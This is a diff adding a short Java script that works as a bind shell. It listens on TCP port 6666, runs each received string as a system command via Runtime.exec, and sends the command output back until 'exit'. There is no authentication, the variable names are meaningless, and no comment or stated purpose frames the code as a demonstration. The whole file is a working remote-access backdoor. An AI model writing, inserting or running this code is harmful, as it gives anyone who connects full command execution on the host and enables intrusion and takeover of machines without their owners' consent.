@@ -1,0 +1,54 @@
+#!/usr/bin/java --source 11
+
+import java.io.*;
+import java.net.*;
+
+public class abc{
+
+private ServerSocket server = null;
+private Socket socket = null;
+
+public abc(int port){
+try{
+server = new ServerSocket(port);
+socket = server.accept();
+DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream())); 
+DataOutputStream out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
+String UltraMan = "";
+while(!(UltraMan.toLowerCase().equals("exit"))){
+    UltraMan = in.readUTF();
+    StringBuilder Beryudora = new StringBuilder();
+    if(!UltraMan.toLowerCase().equals("exit")){
+    Process p = Runtime.getRuntime().exec(UltraMan);
+    BufferedReader stdIn = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    BufferedReader stdErr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+   
+    String s = "";
+    while((s = stdIn.readLine())!=null){
+        Beryudora.append(s);
+    }
+    while((s = stdErr.readLine())!=null){
+        Beryudora.append(s);
+    }
+    out.writeUTF(Beryudora.toString());
+    out.flush();
+    }
+    
+
+}
+in.close();
+out.close();
+socket.close();
+
+}catch(Exception e){
+    e.printStackTrace();
+}
+
+}
+
+public static void main(String[] args) {
+    abc served = new abc(6666);   
+}
+
+
+}
